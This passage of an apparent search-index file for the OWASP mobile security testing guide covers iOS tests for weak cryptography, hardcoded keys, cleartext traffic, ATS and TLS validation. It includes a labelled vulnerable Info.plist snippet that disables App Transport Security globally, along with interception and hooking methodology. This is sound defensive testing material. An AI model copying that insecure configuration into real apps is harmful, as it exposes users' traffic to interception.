followed. Look at insecure and deprecated algorithms and common configuration issues.</p>","tags":["ios","L1","L2","test","MSTG-CRYPTO-2","MSTG-CRYPTO-3","masvs-crypto-1","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0061/#commoncryptor","title":"CommonCryptor","text":"<p>If the app uses standard cryptographic implementations provided by Apple, the easiest way to determine the status of the related algorithm is to check for calls to functions from <code>CommonCryptor</code>, such as <code>CCCrypt</code> and <code>CCCryptorCreate</code>. The source code contains the signatures of all functions of CommonCryptor.h. For instance, <code>CCCryptorCreate</code> has following signature:</p> <pre><code>CCCryptorStatus CCCryptorCreate(\n    CCOperation op,             /* kCCEncrypt, etc. */\n    CCAlgorithm alg,            /* kCCAlgorithmDES, etc. */\n    CCOptions options,          /* kCCOptionPKCS7Padding, etc. */\n    const void *key,            /* raw key material */\n    size_t keyLength,\n    const void *iv,             /* optional initialization vector */\n    CCCryptorRef *cryptorRef);  /* RETURNED */\n</code></pre> <p>You can then compare all the <code>enum</code> types to determine which algorithm, padding, and key material is used. Pay attention to the keying material: the key should be generated securely - either using a key derivation function or a random-number generation function. Note that functions which are noted in chapter \"Cryptography for Mobile Apps\" as deprecated, are still programmatically supported. They should not be used.</p>","tags":["ios","L1","L2","test","MSTG-CRYPTO-2","MSTG-CRYPTO-3","masvs-crypto-1","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0061/#third-party-libraries","title":"Third party libraries","text":"<p>Given the continuous evolution of all third party libraries, this should not be the place to evaluate each library in terms of static analysis. Still there are some points of attention:</p> <ul> <li>Find the library being used: This can be done using the following methods:<ul> <li>Check the cartfile if Carthage is used.</li> <li>Check the podfile if Cocoapods is used.</li> <li>Check the linked libraries: Open the xcodeproj file and check the project properties. Go to the Build Phases tab and check the entries in Link Binary With Libraries for any of the libraries. See earlier sections on how to obtain similar information using  MobSF.</li> <li>In the case of copy-pasted sources: search the headerfiles (in case of using Objective-C) and otherwise the Swift files for known methodnames for known libraries.</li> </ul> </li> <li>Determine the version being used: Always check the version of the library being used and check whether there is a new version available in which possible vulnerabilities or shortcomings are patched. Even without a newer version of a library, it can be the case that cryptographic functions have not been reviewed yet. Therefore we always recommend using a library that has been validated or ensure that you have the ability, knowledge and experience to do validation yourself.</li> <li>By hand?: We recommend not to roll your own crypto, nor to implement known cryptographic functions yourself.</li> </ul>","tags":["ios","L1","L2","test","MSTG-CRYPTO-2","MSTG-CRYPTO-3","masvs-crypto-1","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0062/","title":"MASTG-TEST-0062: Testing Key Management","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Use of Hardcoded Cryptographic Keys in Code</li> <li> Hardcoded Cryptographic Keys in Files</li> </ul>","tags":["ios","L2","test","MSTG-CRYPTO-1","MSTG-CRYPTO-5","masvs-crypto-2","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0062/#overview","title":"Overview","text":"","tags":["ios","L2","test","MSTG-CRYPTO-1","MSTG-CRYPTO-5","masvs-crypto-2","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0062/#static-analysis","title":"Static Analysis","text":"<p>There are various keywords to look for: check the libraries mentioned in the overview and static analysis of the section \"Verifying the Configuration of Cryptographic Standard Algorithms\" for which keywords you can best check on how keys are stored.</p> <p>Always make sure that:</p> <ul> <li>keys are not synchronized over devices if it is used to protect high-risk data.</li> <li>keys are not stored without additional protection.</li> <li>keys are not hardcoded.</li> <li>keys are not derived from stable features of the device.</li> <li>keys are not hidden by use of lower level languages (e.g. C/C++).</li> <li>keys are not imported from unsafe locations.</li> </ul> <p>Check also the list of common cryptographic configuration issues.</p> <p>Most of the recommendations for static analysis can already be found in chapter \"Testing Data Storage for iOS\". Next, you can read up on it at the following pages:</p> <ul> <li>Apple Developer Documentation: Certificates and keys</li> <li>Apple Developer Documentation: Generating new keys</li> <li>Apple Developer Documentation: Key generation attributes</li> </ul>","tags":["ios","L2","test","MSTG-CRYPTO-1","MSTG-CRYPTO-5","masvs-crypto-2","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0062/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Hook cryptographic methods and analyze the keys that are being used. Monitor file system access while cryptographic operations are being performed to assess where key material is written to or read from.</p>","tags":["ios","L2","test","MSTG-CRYPTO-1","MSTG-CRYPTO-5","masvs-crypto-2","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0063/","title":"MASTG-TEST-0063: Testing Random Number Generation","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0063: Testing Random Number Generation (ios)</p> <p> Send Feedback</p>","tags":["ios","L1","L2","test","MSTG-CRYPTO-6","masvs-crypto-1"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0063/#overview","title":"Overview","text":"","tags":["ios","L1","L2","test","MSTG-CRYPTO-6","masvs-crypto-1"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0063/#static-analysis","title":"Static Analysis","text":"<p>In Swift, the <code>SecRandomCopyBytes</code> API is defined as follows:</p> <pre><code>func SecRandomCopyBytes(_ rnd: SecRandomRef?,\n                      _ count: Int,\n                      _ bytes: UnsafeMutablePointer&lt;UInt8&gt;) -&gt; Int32\n</code></pre> <p>The Objective-C version is</p> <pre><code>int SecRandomCopyBytes(SecRandomRef rnd, size_t count, uint8_t *bytes);\n</code></pre> <p>The following is an example of the APIs usage:</p> <pre><code>int result = SecRandomCopyBytes(kSecRandomDefault, 16, randomBytes);\n</code></pre> <p>Note: if other mechanisms are used for random numbers in the code, verify that these are either wrappers around the APIs mentioned above or review them for their secure-randomness. Often this is too hard, which means you can best stick with the implementation above.</p>","tags":["ios","L1","L2","test","MSTG-CRYPTO-6","masvs-crypto-1"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0063/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>If you want to test for randomness, you can try to capture a large set of numbers and check with Burp's sequencer plugin to see how good the quality of the randomness is.</p>","tags":["ios","L1","L2","test","MSTG-CRYPTO-6","masvs-crypto-1"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0209/","title":"MASTG-TEST-0209: Insufficient Key Sizes","text":"","tags":["ios","L1","L2","test","MASWE-0009"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0209/#overview","title":"Overview","text":"<p>In this test case, we will look for the use insufficient key sizes in iOS apps. To do this, we need to focus on the cryptographic frameworks and libraries that are available in iOS and the methods that are used to generate cryptographic keys.</p> <ul> <li>CommonCrypto: The <code>CCCrypt</code> function is used for symmetric encryption and decryption and specifies the key size or key length in its fifth parameter <code>keyLength</code>.</li> <li>Security: The <code>SecKeyCreateRandomKey</code> function is used to generate a random key using certain attributes including <code>kSecAttrKeyType</code> and <code>kSecAttrKeySizeInBits</code>. The <code>SecKeyGeneratePair</code> function is deprecated in iOS 16.</li> <li>CryptoKit: The <code>AES.GCM</code> and <code>ChaChaPoly</code> classes are used for symmetric encryption and decryption.</li> </ul> <p>Since you don't usually generate keys directly in CryptoKit (the library does that for you automatically), we'll focus on the CommonCrypto and Security libraries in this test.</p>","tags":["ios","L1","L2","test","MASWE-0009"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0209/#steps","title":"Steps","text":"<ol> <li>Run a static analysis tool such as  radare2 for iOS on the app binary, or use a dynamic analysis tool like  Frida for iOS, and look for uses of the cryptographic functions that generate keys.</li> </ol>","tags":["ios","L1","L2","test","MASWE-0009"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0209/#observation","title":"Observation","text":"<p>The output should contain the disassembled code of the functions using <code>CCCrypt</code> or other cryptographic functions.</p>","tags":["ios","L1","L2","test","MASWE-0009"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0209/#evaluation","title":"Evaluation","text":"<p>The test case fails if you can find the use of insufficient key sizes within the source code. For example, a 1024-bit key size is considered insufficient for RSA encryption and a 128-bit key size is considered insufficient for AES encryption considering quantum computing attacks.</p>","tags":["ios","L1","L2","test","MASWE-0009"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0209/#demos","title":"Demos","text":"<p> MASTG-DEMO-0011: Uses of Insufficient Key Size in SecKeyCreateRandomKey with r2 </p>","tags":["ios","L1","L2","test","MASWE-0009"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0210/","title":"MASTG-TEST-0210: Broken Symmetric Encryption Algorithms","text":"","tags":["ios","L1","L2","test","MASWE-0020"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0210/#overview","title":"Overview","text":"<p>To test for the use of broken encryption algorithms in iOS apps, we need to focus on methods from cryptographic frameworks and libraries that are used to perform encryption and decryption operations.</p> <ul> <li> <p>CommonCrypto: The <code>CCCrypt</code> function is used for symmetric algorithms and specifies the algorithm in its second parameter <code>alg</code>. This includes:</p> <ul> <li><code>kCCAlgorithmAES128</code></li> <li><code>kCCAlgorithmDES</code></li> <li><code>kCCAlgorithm3DES</code></li> <li><code>kCCAlgorithmCAST</code></li> <li><code>kCCAlgorithmRC4</code></li> <li><code>kCCAlgorithmRC2</code></li> </ul> </li> <li> <p>CryptoKit: This library does not support broken encryption algorithms. It supports the following symmetric algorithms:</p> <ul> <li><code>AES.GCM</code></li> <li><code>ChaChaPoly</code></li> </ul> </li> </ul> <p>Note: the Security framework only supports asymmetric algorithms and is therefore out of scope for this test (see note about symmetric keys).</p>","tags":["ios","L1","L2","test","MASWE-0020"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0210/#steps","title":"Steps","text":"<ol> <li>Run a static analysis tool such as  radare2 for iOS on the app binary, or use a dynamic analysis tool like  Frida for iOS, and look for uses of the cryptographic functions that perform encryption and decryption operations.</li> </ol>","tags":["ios","L1","L2","test","MASWE-0020"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0210/#observation","title":"Observation","text":"<p>The output should contain the disassembled code of the functions using the relevant cryptographic functions.</p>","tags":["ios","L1","L2","test","MASWE-0020"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0210/#evaluation","title":"Evaluation","text":"<p>The test case fails if you can find the use of broken encryption algorithms within the source code. For example:</p> <ul> <li>DES</li> <li>3DES</li> <li>RC2</li> <li>RC4</li> </ul> <p>Stay up-to-date: This is a non-exhaustive list of broken algorithms. Make sure to check the latest standards and recommendations from organizations such as the National Institute of Standards and Technology (NIST), the German Federal Office for Information Security (BSI) or any other relevant authority in your region.</p> <p>Some algorithms may not be considered broken as a whole, but may have risky configurations that should be avoided. For example, using a seed or IV that is not generated by a cryptographically secure pseudorandom number generator (CSPRNG) or that is not considered quantum-safe. For instance, an AES 128-bit key size is insufficient in the face of quantum computing attacks. This is important when building an app that uses data that will be stored for a long time. Make sure you follow the NIST recommendations from NIST IR 8547 \"Transition to Post-Quantum Cryptography Standards\", 2024.</p> <p>Context Considerations:</p> <p>To reduce false positives, make sure you understand the context in which the algorithm is being used before reporting the associated code as insecure. Ensure that it is being used in a security-relevant context to protect sensitive data.</p>","tags":["ios","L1","L2","test","MASWE-0020"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0210/#demos","title":"Demos","text":"<p> MASTG-DEMO-0018: Uses of Broken Encryption Algorithms in CommonCrypto with r2 </p>","tags":["ios","L1","L2","test","MASWE-0020"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0211/","title":"MASTG-TEST-0211: Broken Hashing Algorithms","text":"","tags":["ios","L1","L2","test","MASWE-0021"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0211/#overview","title":"Overview","text":"<p>To test for the use of broken hashing algorithms in iOS apps, we need to focus on methods from cryptographic frameworks and libraries that are used to perform hashing operations.</p> <ul> <li> <p>CommonCrypto: CommonDigest.h defines the following hashing algorithms:</p> <ul> <li><code>CC_MD2</code></li> <li><code>CC_MD4</code></li> <li><code>CC_MD5</code></li> <li><code>CC_SHA1</code></li> <li><code>CC_SHA224</code></li> <li><code>CC_SHA256</code></li> <li><code>CC_SHA384</code></li> <li><code>CC_SHA512</code></li> </ul> </li> <li> <p>CryptoKit: Supports three cryptographically secure hashing algorithms and two insecure ones in a dedicated class called <code>Insecure</code>:</p> <ul> <li><code>SHA256</code></li> <li><code>SHA384</code></li> <li><code>SHA512</code></li> <li><code>Insecure.MD5</code></li> <li><code>Insecure.SHA1</code></li> </ul> </li> </ul> <p>Note: the Security framework only supports asymmetric algorithms and is therefore out of scope for this test.</p>","tags":["ios","L1","L2","test","MASWE-0021"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0211/#steps","title":"Steps","text":"<ol> <li>Run a static analysis tool such as  radare2 for iOS on the app binary, or use a dynamic analysis tool like  Frida for iOS, and look for uses of the cryptographic functions that perform hashing operations.</li> </ol>","tags":["ios","L1","L2","test","MASWE-0021"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0211/#observation","title":"Observation","text":"<p>The output should contain the disassembled code of the functions using the relevant cryptographic functions.</p>","tags":["ios","L1","L2","test","MASWE-0021"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0211/#evaluation","title":"Evaluation","text":"<p>The test case fails if you can find the use of broken hashing algorithms within the source code. For example:</p> <ul> <li>MD5</li> <li>SHA-1</li> </ul> <p>Stay up-to-date: This is a non-exhaustive list of broken algorithms. Make sure to check the latest standards and recommendations from organizations such as the National Institute of Standards and Technology (NIST), the German Federal Office for Information Security (BSI) or any other relevant authority in your region. This is important when building an app that uses data that will be stored for a long time. Make sure you follow the NIST recommendations from NIST IR 8547 \"Transition to Post-Quantum Cryptography Standards\", 2024.</p> <p>Context Considerations:</p> <p>To reduce false positives, make sure you understand the context in which the algorithm is being used before reporting the associated code as insecure. Ensure that it is being used in a security-relevant context to protect sensitive data.</p> <p>For example, using the broken algorithm MD5 for hashing passwords is disallowed by NIST, as it is no longer considered secure for cryptographic purposes. However, using MD5 for checksums or other non-cryptographic tasks, where security is not a concern, is generally acceptable.</p>","tags":["ios","L1","L2","test","MASWE-0021"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0211/#demos","title":"Demos","text":"<p> MASTG-DEMO-0015: Uses of Broken Hashing Algorithms in CommonCrypto with r2  MASTG-DEMO-0016: Uses of Broken Hashing Algorithms in CryptoKit with r2 </p>","tags":["ios","L1","L2","test","MASWE-0021"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0213/","title":"MASTG-TEST-0213: Use of Hardcoded Cryptographic Keys in Code","text":"","tags":["ios","L1","L2","test","MASWE-0014"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0213/#overview","title":"Overview","text":"<p>In this test case, we will examine iOS applications for the presence of hardcoded cryptographic keys. Hardcoded keys can be typically found in calls to cryptographic functions or stored as constants or variables within the code. In iOS, cryptographic keys are often used in the following frameworks:</p> <ul> <li>Security Framework: The <code>SecKeyCreateWithData</code> function allows developers to create a cryptographic key from raw data.</li> <li>CommonCrypto: The <code>CCCrypt</code> can be initialized with raw key data in its <code>key</code> parameter.</li> <li>CryptoKit: Although <code>CryptoKit</code> provides higher-level abstractions for cryptographic operations, developers might still hardcode cryptographic keys in different formats and feed it to methods like <code>P256.Signing.PrivateKey.init(rawRepresentation:)</code> or similar.</li> </ul>","tags":["ios","L1","L2","test","MASWE-0014"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0213/#steps","title":"Steps","text":"<ol> <li>Run a static analysis tool such as  radare2 for iOS on the app binary looking for cryptographic APIs as indicated above.</li> </ol>","tags":["ios","L1","L2","test","MASWE-0014"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0213/#observation","title":"Observation","text":"<p>The output should include any instances where the app uses cryptographic functions that accept raw key data. Whenever possible, the output should also try to point to the raw key data from the binary.</p>","tags":["ios","L1","L2","test","MASWE-0014"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0213/#evaluation","title":"Evaluation","text":"<p>The test fails if calls to cryptographic functions with hardcoded keys are found within binary.</p> <p>You may find the keys being directly passed as arguments to cryptographic functions (byte arrays or string literals) or stored in variables or constants within the code. Typical representations of hardcoded keys include:</p> <ul> <li>Raw Byte Arrays: Cryptographic keys may be directly embedded in the code as arrays of <code>UInt8</code> or <code>Data</code> objects. For example, a 256-bit AES key might be represented as a <code>[UInt8]</code> array.</li> <li>Base64-Encoded Strings: Developers might encode cryptographic keys as Base64 strings within the code, which can be easily decoded by attackers if discovered.</li> <li>Hex-Encoded Strings: Keys are sometimes stored as hexadecimal strings, which are then converted to <code>Data</code> objects at runtime for cryptographic operations.</li> </ul> <p>Ensure that any identified keys are indeed cryptographic keys used for security-relevant purposes. Avoid false positives by verifying the key's usage context (e.g., configuration settings or non-security-related constants might be misidentified as cryptographic keys).</p>","tags":["ios","L1","L2","test","MASWE-0014"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0213/#demos","title":"Demos","text":"<p> MASTG-DEMO-0013: Use of Hardcoded RSA Private Key in SecKeyCreateWithData with r2  MASTG-DEMO-0014: Use of Hardcoded ECDSA Private Key in CryptoKit with r2 </p>","tags":["ios","L1","L2","test","MASWE-0014"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0214/","title":"MASTG-TEST-0214: Hardcoded Cryptographic Keys in Files","text":"","tags":["ios","L1","L2","test","MASWE-0014"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0214/#overview","title":"Overview","text":"<p>Cryptographic keys may be embedded files such as configuration files or key files, certificate files, or other resource files bundled with the app, making them accessible to anyone who can extract the app's resources. Real-world cases include storing API keys, SSL/TLS private keys, or encryption keys within these files, which can lead to serious security vulnerabilities if the app is reverse-engineered.</p> <ul> <li>Identified by File Extension: Files with extensions such as <code>.key</code>, <code>.pem</code>, <code>.crt</code>, <code>.p12</code>, <code>.cer</code>, or <code>.der</code> often contain cryptographic keys or certificates.</li> <li>Identified by PEM Markers: Strings such as <code>-----BEGIN PRIVATE KEY-----</code>, <code>-----BEGIN CERTIFICATE-----</code>, or the byte sequence <code>0x2d 0x2d 0x2d 0x2d 0x2d</code> (representing <code>-----</code> in ASCII) within files indicate the presence of PEM-encoded keys or certificates.</li> <li>Identified by Common Byte Patterns: Binary files containing specific byte sequences that match known DER or PKCS#12 formats, such as <code>0x30 0x82</code> (indicating the start of a DER-encoded structure), can indicate the presence of cryptographic material.</li> <li>Embedded in Property Lists or JSON Files: Keys might be stored within <code>.plist</code> or <code>.json</code> configuration files, often encoded as Base64 strings.</li> <li>Identified by Specific Strings: Keywords such as <code>privateKey</code>, <code>key</code>, or <code>secret</code> within files or variable names can indicate embedded keys or sensitive data.</li> </ul>","tags":["ios","L1","L2","test","MASWE-0014"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0214/#steps","title":"Steps","text":"<ol> <li>Run a static analysis tool such as  radare2 for iOS on the app binary looking for strings or sequences of bytes as indicated above.</li> </ol>","tags":["ios","L1","L2","test","MASWE-0014"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0214/#observation","title":"Observation","text":"<p>The output should include any instances where potential cryptographic keys are found hardcoded within the application's source code or binary.</p>","tags":["ios","L1","L2","test","MASWE-0014"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0214/#evaluation","title":"Evaluation","text":"<p>The test fails if hardcoded cryptographic keys are found within the source code or binary.</p> <p>Ensure that any identified keys are indeed cryptographic keys used for security-relevant purposes. Avoid false positives by verifying the key's usage context (e.g., configuration settings or non-security-related constants might be misidentified as cryptographic keys).</p>","tags":["ios","L1","L2","test","MASWE-0014"]},{"location":"MASTG/tests/ios/MASVS-NETWORK/MASTG-TEST-0065/","title":"MASTG-TEST-0065: Testing Data Encryption on the Network","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0065: Testing Data Encryption on the Network (ios)</p> <p> Send Feedback</p>","tags":["ios","L1","L2","test","MSTG-NETWORK-1","masvs-network-1"]},{"location":"MASTG/tests/ios/MASVS-NETWORK/MASTG-TEST-0065/#overview","title":"Overview","text":"<p>All the presented cases must be carefully analyzed as a whole. For example, even if the app does not permit cleartext traffic in its Info.plist, it might actually still be sending HTTP traffic. That could be the case if it's using a low-level API (for which ATS is ignored) or a badly configured cross-platform framework.</p> <p>IMPORTANT: You should apply these tests to the app main code but also to any app extensions, frameworks or Watch apps embedded within the app as well.</p> <p>For more information refer to the article \"Preventing Insecure Network Connections\" and \"Fine-tune your App Transport Security settings\" in the Apple Developer Documentation.</p>","tags":["ios","L1","L2","test","MSTG-NETWORK-1","masvs-network-1"]},{"location":"MASTG/tests/ios/MASVS-NETWORK/MASTG-TEST-0065/#static-analysis","title":"Static Analysis","text":"","tags":["ios","L1","L2","test","MSTG-NETWORK-1","masvs-network-1"]},{"location":"MASTG/tests/ios/MASVS-NETWORK/MASTG-TEST-0065/#testing-network-requests-over-secure-protocols","title":"Testing Network Requests over Secure Protocols","text":"<p>First, you should identify all network requests in the source code and ensure that no plain HTTP URLs are used. Make sure that sensitive information is sent over secure channels by using <code>URLSession</code> (which uses the standard URL Loading System from iOS) or <code>Network</code> (for socket-level communication using TLS and access to TCP and UDP).</p>","tags":["ios","L1","L2","test","MSTG-NETWORK-1","masvs-network-1"]},{"location":"MASTG/tests/ios/MASVS-NETWORK/MASTG-TEST-0065/#check-for-low-level-networking-api-usage","title":"Check for Low-Level Networking API Usage","text":"<p>Identify the network APIs used by the app and see if it uses any low-level networking APIs.</p> <p>Apple Recommendation: Prefer High-Level Frameworks in Your App: \"ATS doesn't apply to calls your app makes to lower-level networking interfaces like the Network framework or CFNetwork. In these cases, you take responsibility for ensuring the security of the connection. You can construct a secure connection this way, but mistakes are both easy to make and costly. It's typically safest to rely on the URL Loading System instead\" (see source).</p> <p>If the app uses any low-level APIs such as <code>Network</code> or <code>CFNetwork</code>, you should carefully investigate if they are being used securely. For apps using cross-platform frameworks (e.g. Flutter, Xamarin, ...) and third party frameworks (e.g. Alamofire) you should analyze if they're being configured and used securely according to their best practices.</p> <p>Make sure that the app:</p> <ul> <li>verifies the challenge type and the host name and credentials when performing server trust evaluation.</li> <li>doesn't ignore TLS errors.</li> <li>doesn't use any insecure TLS configurations (see  Testing the TLS Settings)</li> </ul> <p>These checks are orientative, we cannot name specific APIs since every app might use a different framework. Please use this information as a reference when inspecting the code.</p>","tags":["ios","L1","L2","test","MSTG-NETWORK-1","masvs-network-1"]},{"location":"MASTG/tests/ios/MASVS-NETWORK/MASTG-TEST-0065/#testing-for-cleartext-traffic","title":"Testing for Cleartext Traffic","text":"<p>Ensure that the app is not allowing cleartext HTTP traffic. Since iOS 9.0 cleartext HTTP traffic is blocked by default (due to App Transport Security (ATS)) but there are multiple ways in which an application can still send it:</p> <ul> <li>Configuring ATS to enable cleartext traffic by setting the <code>NSAllowsArbitraryLoads</code> attribute to <code>true</code> (or <code>YES</code>) on <code>NSAppTransportSecurity</code> in the app's <code>Info.plist</code>.</li> <li>Retrieve the <code>Info.plist</code> (see  Exploring the App Package)</li> <li> <p>Check that <code>NSAllowsArbitraryLoads</code> is not set to <code>true</code> globally of for any domain.</p> </li> <li> <p>If the application opens third party web sites in WebViews, then from iOS 10 onwards <code>NSAllowsArbitraryLoadsInWebContent</code> can be used to disable ATS restrictions for the content loaded in web views.</p> </li> </ul> <p>Apple warns: Disabling ATS means that unsecured HTTP connections are allowed. HTTPS connections are also allowed, and are still subject to default server trust evaluation. However, extended security checks\u2014like requiring a minimum Transport Layer Security (TLS) protocol version\u2014are disabled. Without ATS, you're also free to loosen the default server trust requirements, as described in \"Performing Manual Server Trust Authentication\".</p> <p>The following snippet shows a vulnerable example of an app disabling ATS restrictions globally.</p> <pre><code>&lt;key&gt;NSAppTransportSecurity&lt;/key&gt;\n&lt;dict&gt;\n    &lt;key&gt;NSAllowsArbitraryLoads&lt;/key&gt;\n    &lt;true/&gt;\n&lt;/dict&gt;\n</code></pre> <p>ATS should be examined taking the application's context into consideration. The application may have to define ATS exceptions to fulfill its intended purpose. For example, the Firefox iOS application has ATS disabled globally. This exception is acceptable because otherwise the application would not be able to connect to any HTTP website that does not have all the ATS requirements. In some cases, apps might disable ATS globally but enable it for certain domains to e.g. securely load metadata or still allow secure login.</p> <p>ATS should include a justification string for this (e.g. \"The app must connect to a server managed by another entity that doesn't support secure connections.\").</p>","tags":["ios","L1","L2","test","MSTG-NETWORK-1","masvs-network-1"]},{"location":"MASTG/tests/ios/MASVS-NETWORK/MASTG-TEST-0065/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Intercept the tested app's incoming and outgoing network traffic and make sure that this traffic is encrypted. You can intercept network traffic in any of the following ways:</p> <ul> <li>Capture all HTTP(S) and Websocket traffic with an interception proxy like  ZAP or  Burp Suite and make sure all requests are made via HTTPS instead of HTTP.</li> <li>Interception proxies like Burp and  ZAP will show web related traffic primarily (e.g. HTTP(S), Web Sockets, gRPC, etc.). You can, however, use a Burp plugin such as Burp-non-HTTP-Extension or the tool mitm-relay to decode and visualize communication via XMPP and other protocols.</li> </ul> <p>Some applications may not work with proxies like Burp and ZAP because of Certificate Pinning. In such a scenario, please check  Testing Custom Certificate Stores and Certificate Pinning.</p> <p>For more details refer to:</p> <ul> <li>\"Intercepting Network Traffic Through MITM\"</li> <li> Basic Network Monitoring/Sniffing</li> </ul>","tags":["ios","L1","L2","test","MSTG-NETWORK-1","masvs-network-1"]},{"location":"MASTG/tests/ios/MASVS-NETWORK/MASTG-TEST-0066/","title":"MASTG-TEST-0066: Testing the TLS Settings","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0066: Testing the TLS Settings (ios)</p> <p> Send Feedback</p>","tags":["ios","L1","L2","test","MSTG-NETWORK-2","masvs-network-1"]},{"location":"MASTG/tests/ios/MASVS-NETWORK/MASTG-TEST-0066/#overview","title":"Overview","text":"<p>Remember to inspect the corresponding justifications to discard that it might be part of the app intended purpose.</p> <p>It is possible to verify which ATS settings can be used when communicating to a certain endpoint. On macOS the command line utility <code>nscurl</code> can be used. A permutation of different settings will be executed and verified against the specified endpoint. If the default ATS secure connection test is passing, ATS can be used in its default secure configuration. If there are any fails in the nscurl output, please change the server side configuration of TLS to make the server side more secure, rather than weakening the configuration in ATS on the client. See the article \"Identifying the Source of Blocked Connections\" in the Apple Developer Documentation for more details.</p> <p>Refer to section \"Verifying the TLS Settings\" in chapter Testing Network Communication for details.</p>","tags":["ios","L1","L2","test","MSTG-NETWORK-2","masvs-network-1"]},{"location":"MASTG/tests/ios/MASVS-NETWORK/MASTG-TEST-0067/","title":"MASTG-TEST-0067: Testing Endpoint Identity Verification","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0067: Testing Endpoint Identity Verification (ios)</p> <p> Send Feedback</p>","tags":["ios","L1","L2","test","MSTG-NETWORK-3","masvs-network-1"]},{"location":"MASTG/tests/ios/MASVS-NETWORK/MASTG-TEST-0067/#overview","title":"Overview","text":"","tags":["ios","L1","L2","test","MSTG-NETWORK-3","masvs-network-1"]},{"location":"MASTG/tests/ios/MASVS-NETWORK/MASTG-TEST-0067/#static-analysis","title":"Static Analysis","text":"<p>Using TLS to transport sensitive information over the network is essential for security. However, encrypting communication between a mobile application and its backend API is not trivial. Developers often decide on simpler but less secure solutions (e.g., those that accept any certificate) to facilitate the development process, and sometimes these weak solutions make it into the production version, potentially exposing users to Machine-in-the-Middle (MITM) attacks. See \"CWE-295: Improper Certificate Validation\".</p> <p>These are some of the issues should be addressed:</p> <ul> <li>Check if the app links against an SDK older than iOS 9.0. In that case ATS is disabled no matter which version of the OS the app runs on.</li> <li>Verify that a certificate comes from a trusted source, i.e. a trusted CA (Certificate Authority).</li> <li>Determine whether the endpoint server presents the right certificate.</li> </ul> <p>Make sure that the hostname and the certificate itself are verified correctly. Examples and common pitfalls are available in the official Apple documentation.</p> <p>We highly recommend supporting static analysis with the dynamic analysis. If you don't have the source code or the app is difficult to reverse engineer, having a solid dynamic analysis strategy can definitely help. In that case you won't know if the app uses low or high-level APIs but you can still test for different trust evaluation scenarios (e.g. \"does the app accept a self-signed certificate?\").</p>","tags":["ios","L1","L2","test","MSTG-NETWORK-3","masvs-network-1"]},{"location":"MASTG/tests/ios/MASVS-NETWORK/MASTG-TEST-0067/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Our test approach is to gradually relax security of the SSL handshake negotiation and check which security mechanisms are enabled.</p> <ol> <li>Having Burp set up as a proxy, make sure that there is no certificate added to the trust store (Settings 